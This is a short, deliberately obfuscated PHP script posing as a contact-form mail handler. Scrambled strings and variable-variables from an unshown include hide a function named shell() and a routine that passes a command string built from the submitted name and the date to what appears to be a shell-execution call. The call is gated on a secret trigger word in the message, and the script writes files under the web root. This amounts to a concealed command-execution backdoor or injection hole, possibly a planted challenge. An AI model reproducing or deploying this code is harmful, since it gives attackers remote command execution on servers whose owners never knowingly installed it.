<?php 

include "variables.php";


$kadsooasd="st";
$ldksadsakla="ev";
$lkklklkdasl="r";
$iewkhrw=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla;
$ahshitherewegoagaindude = "bjlgqipqipeaelohasnda";
$ahshitherewegoagaindude.=$ahshitherewegoagaindude[strlen($ahshitherewegoagaindude)-7];
$ahshitherewegoagaindude.=$ahshitherewegoagaindude[2];
$ahshitherewegoagaindude.=$ahshitherewegoagaindude[strlen($ahshitherewegoagaindude)-10];
$ahshitherewegoagaindude.=$ahshitherewegoagaindude[10];
$ahshitherewegoagaindude.=$ahshitherewegoagaindude[strlen($ahshitherewegoagaindude)-10];
$ahshitherewegoagaindude=substr($ahshitherewegoagaindude,strlen($ahshitherewegoagaindude)-(ord($ahshitherewegoagaindude[4])-ord($ahshitherewegoagaindude[2])));
$ahshitherewegoagaindude=@$iewkhrw($ahshitherewegoagaindude);
function shell($lkklklkdaslmd){
	include "variables.php";
	return @$$$$kamu($lkklklkdaslmd);
};

function title($string){
	include "variables.php";
	global $iewkhrw;
	$date = date('Y-m-d');
	$kadsooasds = @$iewkhrw(chr(111)."h".$$$$$heker[0].$$dia[2]);
	$string = str_replace(" ","_",$string);
	$ret=$$$$$$$kamu.$$$mati[0];
	return @$ret("$kadsooasds \"$string-$date.txt\"");
}

if (isset($_POST['name'], $_POST['email'], $_POST['subject'],
$_POST['message'])){ 
	if (!empty(strpos("unity $_POST[message]", $ahshitherewegoagaindude))){
		$f = fopen("$_SERVER[DOCUMENT_ROOT]/uny/mail/".title(htmlentities($_POST['name'])), 'w');
		$isi = "From\t\t: $_POST[email]
Subject\t\t: $_POST[subject]
Message\t\t: $_POST[message]";
		fwrite($f, $isi);
		die("Done");
	}
} 
?>